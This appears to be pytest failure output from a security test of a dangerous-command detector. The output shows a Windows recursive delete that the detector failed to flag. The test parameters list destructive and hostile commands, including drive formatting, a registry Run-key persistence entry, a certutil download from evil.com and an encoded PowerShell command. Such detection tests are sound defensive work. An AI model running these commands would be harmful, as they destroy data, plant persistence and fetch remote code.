@@ -1,0 +1,29 @@
+...........................................F
+=================================== FAILURES ===================================
+_ TestWindowsDangerousCommands.test_windows_patterns_hit[rd /s /q C:\\project] _
+
+self = <test_permission_security.TestWindowsDangerousCommands object at 0x7f2fc990dca0>
+command = 'rd /s /q C:\\project'
+
+    @pytest.mark.parametrize("command", [
+        "rd /s /q C:\\project",
+        "del /f /s /q C:\\project\\*",
+        "format D:",
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d calc",
+        "certutil -urlcache -f http://evil.com/x.exe x.exe",
+        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
+        "Remove-Item -Recurse -Force C:\\ -ErrorAction SilentlyContinue",
+    ])
+    def test_windows_patterns_hit(self, command: str):
+        detector = DangerousCommandDetector()
+        hit, reason = detector.detect(command)
+>       assert hit, f"{command} must be denied: {reason}"
+E       AssertionError: rd /s /q C:\project must be denied: 
+E       assert False
+
+tests/test_permission_security.py:897: AssertionError
+=========================== short test summary info ============================
+FAILED tests/test_permission_security.py::TestWindowsDangerousCommands::test_windows_patterns_hit[rd /s /q C:\\project] - AssertionError: rd /s /q C:\project must be denied: 
+assert False
+!!!!!!!!!!!!!!!!!!!!!!!!!! stopping after 1 failures !!!!!!!!!!!!!!!!!!!!!!!!!!!
+1 failed, 43 passed in 1.76s
